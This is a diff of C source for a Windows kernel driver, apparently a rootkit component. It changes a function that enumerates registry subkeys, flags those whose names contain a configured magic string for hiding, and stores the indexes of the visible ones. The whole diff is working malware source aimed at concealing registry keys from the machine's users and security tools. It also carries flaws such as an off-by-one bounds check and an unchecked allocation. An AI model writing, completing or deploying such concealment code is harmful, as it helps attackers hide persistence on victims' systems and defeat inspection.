@@ -23,10 +23,12 @@ void PrintRegistryKeyHandleInformation(HANDLE KeyHandle, const wchar_t* CallingF
 }
 
 // 
-NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PINT32 HideSubkeyIndexesCount, _Out_ PINT32 OkSubkeyIndexesCount, _Out_ PVOID OkSubkeyIndexes) {
-    UNREFERENCED_PARAMETER(HideSubkeyIndexesCount);
-    UNREFERENCED_PARAMETER(OkSubkeyIndexesCount);
+NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PULONG HideSubkeyIndexesCount, _Out_ PULONG OkSubkeyIndexesCount, _Out_ PULONG* OkSubkeyIndexes) {
     UNREFERENCED_PARAMETER(OkSubkeyIndexes);
+
+    // initialize memory
+    *HideSubkeyIndexesCount = 0;
+    *OkSubkeyIndexesCount = 0;
 
     NTSTATUS status = -1;
     ULONG resultLength = 0;
@@ -58,12 +60,21 @@ NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PINT32 HideSubk
     kprintf("[+] RegistryKeyHideInformation: ZwQueryKey subkeys count: %d.\n", keyInfo->SubKeys);
     ULONG SubKeysCount = keyInfo->SubKeys;
     ExFreePool(keyInfo);
+    
+    // allocate memory for OK indexes
+    *OkSubkeyIndexes = (PULONG)ExAllocatePool(NonPagedPool, SubKeysCount * sizeof(ULONG));
+    memset(*OkSubkeyIndexes, 0, SubKeysCount * sizeof(ULONG)); // erease memory
 
     // Retrieve subkeys using ZwEnumerateKey
-    ULONG index = 0;
+    ULONG KeyIndex = 0;
     while (1) {
+        if (*OkSubkeyIndexesCount > SubKeysCount || KeyIndex > SubKeysCount) {
+            kprintf("[-] RegistryKeyHideInformation: Index out of bound (%d %d %d). Should not have happened.\n", KeyIndex, *OkSubkeyIndexesCount, SubKeysCount);
+            return STATUS_FAIL_CHECK;
+        }
+
         // get buffer size
-        status = ZwEnumerateKey(KeyHandle, index, KeyBasicInformation, NULL, 0, &resultLength);
+        status = ZwEnumerateKey(KeyHandle, KeyIndex, KeyBasicInformation, NULL, 0, &resultLength);
         if (status == STATUS_NO_MORE_ENTRIES) {
             break;
         }
@@ -78,7 +89,7 @@ NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PINT32 HideSubk
             return STATUS_INSUFFICIENT_RESOURCES;
         }
 
-        status = ZwEnumerateKey(KeyHandle, index, KeyBasicInformation, subKeyInfo, resultLength, &resultLength);
+        status = ZwEnumerateKey(KeyHandle, KeyIndex, KeyBasicInformation, subKeyInfo, resultLength, &resultLength);
         if (NT_SUCCESS(status)) {
             
             // validate if this key is OK or not
@@ -91,20 +102,23 @@ NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PINT32 HideSubk
 
             // TODO? - better function that evaluates whether a subkey should be hidden?
             if (wcsstr(SubKeyNameBuffer, Settings.RegistryKeyMagicName)) {
-                kprintf("[+] RegistryKeyHideInformation (SHOULD HIDE): subKey index %d: %ws\n", index, SubKeyNameBuffer);
+                kprintf("[+] RegistryKeyHideInformation (SHOULD HIDE): subKey index %d: %ws\n", KeyIndex, SubKeyNameBuffer);
+                *HideSubkeyIndexesCount += 1;
             }
             else {
-                kprintf("[+] RegistryKeyHideInformation: subKey index %d: %ws\n", index, SubKeyNameBuffer);
+                kprintf("[+] RegistryKeyHideInformation: subKey index %d: %ws\n", KeyIndex, SubKeyNameBuffer);
+                (*OkSubkeyIndexes)[*OkSubkeyIndexesCount] = KeyIndex;
+                *OkSubkeyIndexesCount += 1;
             }
         }
         else {
-            kprintf("[-] RegistryKeyHideInformation: Second call to ZwEnumerateKey failed (index %d). Shouuld not have happened...\n", index);
+            kprintf("[-] RegistryKeyHideInformation: Second call to ZwEnumerateKey failed (index %d). Shouuld not have happened...\n", KeyIndex);
             ExFreePool(subKeyInfo);
             return status;
         }
 
         ExFreePool(subKeyInfo);
-        index++;
+        KeyIndex++;
     };
 
     return STATUS_SUCCESS;
